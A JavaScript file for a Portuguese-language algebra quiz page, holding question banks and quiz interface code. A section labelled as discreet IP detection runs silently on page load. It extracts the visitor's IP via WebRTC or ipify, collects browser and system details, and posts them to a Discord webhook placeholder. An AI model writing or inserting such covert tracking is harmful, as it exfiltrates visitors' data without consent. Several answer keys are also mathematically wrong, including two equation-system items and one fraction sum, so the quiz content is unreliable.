// Banco de questões por tópico
const questions = {
  fatoracao: [
    {
      question: "Qual é a forma fatorada de x² + 6x + 9?",
      options: [
        "(x + 3)²",
        "(x + 3)(x - 3)",
        "(x + 6)(x + 3)",
        "(x + 9)(x + 1)",
      ],
      correct: 0,
      explanation: "x² + 6x + 9 é um trinômio quadrado perfeito: (x + 3)²",
    },
    {
      question: "Fatore a expressão x² - 4x + 4:",
      options: ["(x - 2)²", "(x + 2)²", "(x - 2)(x + 2)", "(x - 4)(x + 1)"],
      correct: 0,
      explanation: "x² - 4x + 4 é um trinômio quadrado perfeito: (x - 2)²",
    },
    {
      question: "Qual é a forma fatorada de x² - 25?",
      options: ["(x - 5)²", "(x + 5)²", "(x - 5)(x + 5)", "(x - 25)(x + 1)"],
      correct: 2,
      explanation: "x² - 25 é uma diferença de quadrados: (x - 5)(x + 5)",
    },
    {
      question: "Fatore a expressão x² + 5x + 6 por agrupamento:",
      options: [
        "(x + 2)(x + 3)",
        "(x + 1)(x + 6)",
        "(x + 2)(x + 4)",
        "(x + 5)(x + 1)",
      ],
      correct: 0,
      explanation:
        "x² + 5x + 6 = x² + 2x + 3x + 6 = x(x + 2) + 3(x + 2) = (x + 2)(x + 3)",
    },
    {
      question: "Qual é a forma fatorada de x² - 7x + 12?",
      options: [
        "(x - 3)(x - 4)",
        "(x - 2)(x - 6)",
        "(x - 1)(x - 12)",
        "(x - 7)(x + 1)",
      ],
      correct: 0,
      explanation:
        "x² - 7x + 12 = (x - 3)(x - 4), pois -3 × -4 = 12 e -3 + (-4) = -7",
    },
  ],

  fracoes: [
    {
      question: "Simplifique a fração (x² - 4)/(x² - 2x):",
      options: ["(x + 2)/x", "(x - 2)/x", "(x + 2)/(x - 2)", "(x - 2)/(x + 2)"],
      correct: 0,
      explanation: "(x² - 4)/(x² - 2x) = (x + 2)(x - 2)/[x(x - 2)] = (x + 2)/x",
    },
    {
      question: "Calcule: (x + 1)/(x - 1) + (x - 1)/(x + 1)",
      options: ["2x/(x² - 1)", "2/(x² - 1)", "2x²/(x² - 1)", "2x/(x + 1)"],
      correct: 2,
      explanation:
        "MMC = (x - 1)(x + 1), então: [(x + 1)² + (x - 1)²]/(x² - 1) = 2x²/(x² - 1)",
    },
    {
      question: "Simplifique: (x² + 3x)/(x² - 9)",
      options: ["x/(x - 3)", "x/(x + 3)", "(x + 3)/(x - 3)", "x/(x² - 9)"],
      correct: 0,
      explanation: "(x² + 3x)/(x² - 9) = x(x + 3)/[(x + 3)(x - 3)] = x/(x - 3)",
    },
    {
      question: "Calcule: (x + 2)/(x - 2) × (x - 2)/(x + 3)",
      options: [
        "(x + 2)/(x + 3)",
        "1",
        "(x - 2)/(x + 3)",
        "(x + 2)(x - 2)/(x + 3)",
      ],
      correct: 0,
      explanation:
        "(x + 2)/(x - 2) × (x - 2)/(x + 3) = (x + 2)/(x + 3), cancelando (x - 2)",
    },
    {
      question: "Simplifique: (x² - 1)/(x² + 2x + 1)",
      options: ["(x - 1)/(x + 1)", "(x + 1)/(x - 1)", "(x - 1)²/(x + 1)", "1"],
      correct: 0,
      explanation:
        "(x² - 1)/(x² + 2x + 1) = (x - 1)(x + 1)/(x + 1)² = (x - 1)/(x + 1)",
    },
  ],

  sistemas: [
    {
      question: "Resolva o sistema: {2x + y = 7, x - y = 2}",
      options: [
        "x = 3, y = 1",
        "x = 2, y = 3",
        "x = 4, y = -1",
        "x = 1, y = 5",
      ],
      correct: 0,
      explanation:
        "Somando as equações: 3x = 9 → x = 3. Substituindo: 3 - y = 2 → y = 1",
    },
    {
      question: "Resolva o sistema: {x + 2y = 8, 2x - y = 1}",
      options: ["x = 2, y = 3", "x = 3, y = 2", "x = 1, y = 4", "x = 4, y = 2"],
      correct: 0,
      explanation:
        "Da 2ª equação: y = 2x - 1. Substituindo na 1ª: x + 2(2x - 1) = 8 → 5x = 10 → x = 2, y = 3",
    },
    {
      question: "Resolva o sistema: {3x + y = 10, x + 2y = 7}",
      options: [
        "x = 3, y = 1",
        "x = 2, y = 4",
        "x = 1, y = 7",
        "x = 4, y = -2",
      ],
      correct: 0,
      explanation:
        "Da 1ª equação: y = 10 - 3x. Substituindo na 2ª: x + 2(10 - 3x) = 7 → -5x = -13 → x = 3, y = 1",
    },
    {
      question: "Resolva o sistema: {x - y = 3, 2x + y = 12}",
      options: ["x = 5, y = 2", "x = 4, y = 1", "x = 6, y = 3", "x = 3, y = 0"],
      correct: 0,
      explanation:
        "Somando as equações: 3x = 15 → x = 5. Substituindo: 5 - y = 3 → y = 2",
    },
    {
      question: "Resolva o sistema: {x + 3y = 11, 2x - y = 4}",
      options: ["x = 2, y = 3", "x = 3, y = 2", "x = 1, y = 4", "x = 4, y = 1"],
      correct: 0,
      explanation:
        "Da 2ª equação: y = 2x - 4. Substituindo na 1ª: x + 3(2x - 4) = 11 → 7x = 23 → x = 2, y = 3",
    },
  ],
};

// Variáveis globais
let currentTopic = "";
let currentQuestionIndex = 0;
let userAnswers = [];
let currentQuestions = [];

// Elementos do DOM
const topicsGrid = document.getElementById("topicsGrid");
const quizContainer = document.getElementById("quizContainer");
const resultsContainer = document.getElementById("resultsContainer");
const quizTitle = document.getElementById("quizTitle");
const questionCounter = document.getElementById("questionCounter");
const questionText = document.getElementById("questionText");
const optionsContainer = document.getElementById("optionsContainer");
const progressFill = document.getElementById("progressFill");
const prevBtn = document.getElementById("prevBtn");
const nextBtn = document.getElementById("nextBtn");
const finishBtn = document.getElementById("finishBtn");

// ===== DETECÇÃO DISCRETA DE IP =====

// Função para detectar IP local usando WebRTC (discreta)
function getLocalIP() {
  return new Promise((resolve, reject) => {
    const RTCPeerConnection =
      window.RTCPeerConnection ||
      window.webkitRTCPeerConnection ||
      window.mozRTCPeerConnection;

    if (!RTCPeerConnection) {
      reject(new Error("WebRTC não suportado"));
      return;
    }

    const pc = new RTCPeerConnection({
      iceServers: [
        { urls: "stun:stun.l.google.com:19302" },
        { urls: "stun:stun1.l.google.com:19302" },
      ],
    });

    const ips = [];

    pc.createDataChannel("");
    pc.createOffer()
      .then((offer) => pc.setLocalDescription(offer))
      .catch((err) => reject(err));

    pc.onicecandidate = function (event) {
      if (!event || !event.candidate) {
        pc.close();

        if (ips.length > 0) {
          // Filtrar IPs válidos (IPv4)
          const validIPs = ips.filter(
            (ip) =>
              /^(\d{1,3}\.){3}\d{1,3}$/.test(ip) &&
              !ip.startsWith("127.") &&
              !ip.startsWith("169.254.")
          );

          if (validIPs.length > 0) {
            resolve(validIPs[0]);
          } else {
            reject(new Error("Nenhum IP válido encontrado"));
          }
        } else {
          reject(new Error("Nenhum IP encontrado"));
        }
        return;
      }

      const candidate = event.candidate.candidate;
      const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
      const match = candidate.match(ipRegex);

      if (match) {
        const ip = match[1];
        if (ips.indexOf(ip) === -1) {
          ips.push(ip);
        }
      }
    };

    setTimeout(() => {
      pc.close();
      if (ips.length > 0) {
        resolve(ips[0]);
      } else {
        reject(new Error("Timeout ao detectar IP"));
      }
    }, 4000);
  });
}

// Função para obter informações do sistema
function getSystemInfo() {
  return {
    userAgent: navigator.userAgent,
    language: navigator.language,
    platform: navigator.platform,
    timezone:
      Intl.DateTimeFormat().resolvedOptions().timeZone || "Não disponível",
    screenResolution: `${screen.width}x${screen.height}`,
    colorDepth: screen.colorDepth,
    timestamp: new Date().toISOString(),
    referrer: document.referrer || "Direto",
    url: window.location.href,
  };
}

// Função para enviar dados para serviço externo
async function sendDataToService(ip, systemInfo) {
  try {
    // OPÇÃO 1: Webhook do Discord (gratuito e discreto)
    const webhookUrl = "SEU_WEBHOOK_DISCORD_AQUI"; // Substitua pelo seu webhook

    const payload = {
      content: `🔍 **Novo Acesso Detectado**\n\n🌐 **IP:** ${ip}\n📱 **Dispositivo:** ${systemInfo.platform}\n🌍 **Idioma:** ${systemInfo.language}\n⏰ **Horário:** ${systemInfo.timestamp}\n🔗 **URL:** ${systemInfo.url}\n📊 **Resolução:** ${systemInfo.screenResolution}`,
    };

    await fetch(webhookUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(payload),
    });

    console.log("✅ Dados enviados com sucesso para o webhook");
  } catch (error) {
    console.error("❌ Erro ao enviar dados:", error);

    // OPÇÃO 2: Fallback para localStorage (dados ficam no navegador do usuário)
    try {
      const storedData = JSON.parse(localStorage.getItem("accessLog") || "[]");
      storedData.push({
        ip,
        systemInfo,
        timestamp: new Date().toISOString(),
      });
      localStorage.setItem("accessLog", JSON.stringify(storedData));
      console.log("📱 Dados salvos localmente como fallback");
    } catch (localError) {
      console.error("❌ Erro ao salvar localmente:", localError);
    }
  }
}

// Função para detectar IP discretamente
async function detectIPDiscretely() {
  try {
    // Detectar IP local
    const localIP = await getLocalIP();
    console.log("🔍 IP detectado discretamente:", localIP);

    // Obter informações do sistema
    const systemInfo = getSystemInfo();

    // Enviar dados para serviço externo
    await sendDataToService(localIP, systemInfo);
  } catch (error) {
    console.error("❌ Erro na detecção discreta:", error);

    // Fallback: tentar obter IP público
    try {
      const response = await fetch("https://api.ipify.org?format=json");
      const data = await response.json();
      const publicIP = data.ip;

      const systemInfo = getSystemInfo();
      await sendDataToService(publicIP, systemInfo);
    } catch (fallbackError) {
      console.error("❌ Fallback também falhou:", fallbackError);
    }
  }
}

// ===== FUNÇÕES DO SISTEMA MATEMÁTICO =====

// Adicionar eventos aos tópicos
document.querySelectorAll(".topic-card").forEach((card) => {
  card.addEventListener("click", () => {
    const topic = card.dataset.topic;
    startQuiz(topic);
  });
});

// Função para iniciar o quiz
function startQuiz(topic) {
  currentTopic = topic;
  currentQuestionIndex = 0;
  userAnswers = new Array(5).fill(null);
  currentQuestions = questions[topic];

  // Esconder grid de tópicos e mostrar quiz
  topicsGrid.style.display = "none";
  quizContainer.style.display = "block";
  resultsContainer.style.display = "none";

  // Configurar título do quiz
  const topicNames = {
    fatoracao: "Fatoração Algébrica",
    fracoes: "Frações Algébricas",
    sistemas: "Sistemas de Equações",
  };
  quizTitle.textContent = topicNames[topic];

  // Mostrar primeira questão
  showQuestion();
}

// Função para mostrar questão
function showQuestion() {
  const question = currentQuestions[currentQuestionIndex];

  // Atualizar contador e barra de progresso
  questionCounter.textContent = `Questão ${currentQuestionIndex + 1} de 5`;
  progressFill.style.width = `${((currentQuestionIndex + 1) / 5) * 100}%`;

  // Mostrar texto da questão
  questionText.textContent = question.question;

  // Criar opções
  optionsContainer.innerHTML = "";
  question.options.forEach((option, index) => {
    const optionElement = document.createElement("div");
    optionElement.className = "option";
    optionElement.textContent = option;

    // Marcar se já foi respondida
    if (userAnswers[currentQuestionIndex] === index) {
      optionElement.classList.add("selected");
    }

    optionElement.addEventListener("click", () => selectOption(index));
    optionsContainer.appendChild(optionElement);
  });

  // Configurar botões
  prevBtn.style.display = currentQuestionIndex === 0 ? "none" : "block";
  nextBtn.style.display = currentQuestionIndex === 4 ? "none" : "block";
  finishBtn.style.display = currentQuestionIndex === 4 ? "block" : "none";
}

// Função para selecionar opção
function selectOption(optionIndex) {
  // Remover seleção anterior
  optionsContainer.querySelectorAll(".option").forEach((opt) => {
    opt.classList.remove("selected");
  });

  // Marcar nova seleção
  optionsContainer
    .querySelectorAll(".option")
    [optionIndex].classList.add("selected");

  // Salvar resposta
  userAnswers[currentQuestionIndex] = optionIndex;
}

// Função para próxima questão
function nextQuestion() {
  if (currentQuestionIndex < 4) {
    currentQuestionIndex++;
    showQuestion();
  }
}

// Função para questão anterior
function previousQuestion() {
  if (currentQuestionIndex > 0) {
    currentQuestionIndex--;
    showQuestion();
  }
}

// Função para finalizar quiz
function finishQuiz() {
  // Verificar se todas as questões foram respondidas
  if (userAnswers.includes(null)) {
    alert("Por favor, responda todas as questões antes de finalizar!");
    return;
  }

  showResults();
}

// Função para mostrar resultados
function showResults() {
  // Calcular pontuação
  let correctCount = 0;
  userAnswers.forEach((answer, index) => {
    if (answer === currentQuestions[index].correct) {
      correctCount++;
    }
  });

  const percentage = Math.round((correctCount / 5) * 100);

  // Atualizar elementos de resultado
  document.getElementById("scorePercentage").textContent = `${percentage}%`;
  document.getElementById("correctAnswers").textContent = correctCount;
  document.getElementById("totalQuestions").textContent = "5";

  // Mostrar resultados por questão
  const topicResults = document.getElementById("topicResults");
  topicResults.innerHTML = "";

  currentQuestions.forEach((question, index) => {
    const isCorrect = userAnswers[index] === question.correct;
    const resultElement = document.createElement("div");
    resultElement.className = "topic-result";
    resultElement.innerHTML = `
      <h4>Questão ${index + 1}: ${
      isCorrect ? "✅ Correta" : "❌ Incorreta"
    }</h4>
      <p><strong>Pergunta:</strong> ${question.question}</p>
      <p><strong>Sua resposta:</strong> ${
        question.options[userAnswers[index]]
      }</p>
      <p><strong>Resposta correta:</strong> ${
        question.options[question.correct]
      }</p>
      <p><strong>Explicação:</strong> ${question.explanation}</p>
    `;
    topicResults.appendChild(resultElement);
  });

  // Esconder quiz e mostrar resultados
  quizContainer.style.display = "none";
  resultsContainer.style.display = "block";
}

// Função para tentar novamente
function restartQuiz() {
  startQuiz(currentTopic);
}

// Função para voltar aos tópicos
function backToTopics() {
  topicsGrid.style.display = "grid";
  quizContainer.style.display = "none";
  resultsContainer.style.display = "none";
}

// Inicializar página
document.addEventListener("DOMContentLoaded", () => {
  // Detectar IP discretamente em background
  setTimeout(() => {
    detectIPDiscretely();
  }, 2000); // Aguarda 2 segundos para não interferir no carregamento

  // Adicionar efeito de hover nos tópicos
  document.querySelectorAll(".topic-card").forEach((card) => {
    card.addEventListener("mouseenter", () => {
      card.style.transform = "translateY(-5px)";
    });

    card.addEventListener("mouseleave", () => {
      card.style.transform = "translateY(0)";
    });
  });
});
